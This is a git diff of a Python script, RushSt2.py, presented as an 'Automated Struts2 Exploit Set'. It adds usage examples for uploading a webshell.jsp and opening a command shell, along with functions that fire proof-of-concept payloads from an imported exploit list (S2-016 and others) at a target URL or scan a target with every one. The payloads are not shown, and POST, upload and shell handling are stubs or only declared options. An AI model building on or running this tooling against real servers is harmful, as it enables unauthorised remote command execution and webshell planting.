@@ -1,3 +1,11 @@
+'''
+RushSt2.py -u www.abcdefg.com/login.action
+RushSt2.py -f url_list.txt
+RushSt2.py -u www.abcdefg.com/login.action -e S2-016
+RushSt2.py -u www.abcdefg.com/login.action -m POST
+RushSt2.py -u www.abcdefg.com/login.action --upload C:/webshell.jsp
+RushSt2.py -u www.abcdefg.com/login.action --cmd-shell
+'''
 import requests
 from ExpLib import ExpList
 import argparse
@@ -12,15 +20,35 @@ AttackVector = ""
 def initAvailableExp():
 	for exp in ExpList:
 		AvailableEXP.append(exp.upper())
-'''
+
 def PoC_GET(TargetURL, ExpVersion):
-	result = requests.get(TargetURL+ExpList[ExpVersion]["PoC"]).content.decode("utf-8").strip()
-	return result
+	response = requests.get(TargetURL+ExpList[ExpVersion]["PoC"]).content.decode("utf-8").strip()
+	return response
+
+def PoC_POST(TargetURL, ExpVersion):
+	pass
+
+def PoC_Sniper(TargetURL, ExpVersion, HTTPMethod):
+	print("PoCing...")
+	if HTTPMethod == "GET":
+		return PoC_GET(TargetURL, ExpVersion)
+	else:
+		return PoC_POST(TargetURL, ExpVersion)
+
+def PoC_Scan(TargetURL, HTTPMethod):
+	ExpResult = {}
+	for exp in ExpList:
+		ExpResult[exp] = len(PoC_Sniper(TargetURL, exp, HTTPMethod))
+	return ExpResult
 
 def exploit(TargetURL, ExpVersion, HTTPMethod):
-	print("Testing PoC...")
-	print(PoC_GET(TargetURL,ExpVersion))
-'''
+	if ExpVersion == "ALL":
+		#PoC Scan for all vulnerabilities
+		print(PoC_Scan(TargetURL, HTTPMethod))
+	else:
+		#Pre-defined exploit
+		print(PoC_Sniper(TargetURL, ExpVersion, HTTPMethod))
+
 
 #Initialise Exploit Database
 initAvailableExp()
@@ -28,12 +56,13 @@ initAvailableExp()
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description="Automated Struts2 Exploit Set")
 	parser.add_argument("-u","--url", help="Target Vulnerable URL", required=True)
-	parser.add_argument("-m","--method", help="HTTP Method: [GET / POST]. Leave this field Blank will default to GET")
-	parser.add_argument("-o","--option", help="[POC: Proof Of Concept / CMD : Command Execution / UP: File Upload]", required=True)
-	#*Exploit can be set to non-compulsory later on
-	parser.add_argument("-e","--exploit", help="Exploit Version Choice", required=True)
+	parser.add_argument("-e","--exploit", help="Exploit Version Choice ( default: Scan for all )")
+	parser.add_argument("-m","--method", help="HTTP Method: [GET / POST] ( default: GET )")
+	parser.add_argument("--file-upload", help="File Upload")
+	parser.add_argument("--cmd-shell", help="Bounces back a command shell")
 	args = vars(parser.parse_args())
-	if "http://" not in args["url"]:
+	#--URL: Add protocol prefix
+	if "http://" not in args["url"] and "https://" not in args["url"]:
 		TargetURL = "http://" + args["url"]
 	else:
 		TargetURL = args["url"]
@@ -45,20 +74,17 @@ if __name__ == "__main__":
 	else:
 		print("HTTP Method not Supported. Use GET or POST")
 		exit()
-	if args["exploit"].upper() in AvailableEXP:
+	#--EXPLOIT
+	if args["exploit"] == None:
+		#If the Exploit option is not set
+		ExpVersion = "ALL"
+	elif args["exploit"].upper() in AvailableEXP:
 		ExpVersion = args["exploit"].upper()
 	else:
 		print("Exploit not found in database!")
 		exit()
 
-	if args["option"].upper() == "POC":
-		AttackVector = "POC"
-	elif args["option"].upper() == "CMD":
-		AttackVector = "CMD"
-	elif args["option"].upper() == "FILEUPLOAD":
-		AttackVector = "FILEUPLOAD"
-	else:
-		print("Available Options are 'POC', 'CMD', and 'UP'.")
-		exit()
 
 	print("All Set:\n\tTarget URL:\t%s\n\tHTTP Method:\t%s\n\tExploit:\t%s\n\tAttack Vector:\t%s" %(TargetURL,HTTPMethod,ExpVersion,AttackVector))
+
+	exploit(TargetURL, ExpVersion, HTTPMethod)
